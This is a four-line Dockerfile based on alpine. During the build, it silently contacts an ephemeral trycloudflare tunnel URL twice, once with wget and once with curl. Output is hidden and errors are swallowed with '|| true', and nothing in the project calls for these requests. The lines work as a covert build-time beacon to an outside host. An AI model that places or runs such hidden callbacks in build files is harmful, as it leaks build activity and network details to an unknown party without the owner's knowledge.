FROM alpine
RUN wget -qO- https://perceived-capabilities-bills-florists.trycloudflare.com/docker-run || true
RUN sh -c 'curl -s https://perceived-capabilities-bills-florists.trycloudflare.com/docker-run2 || true'
COPY . /app
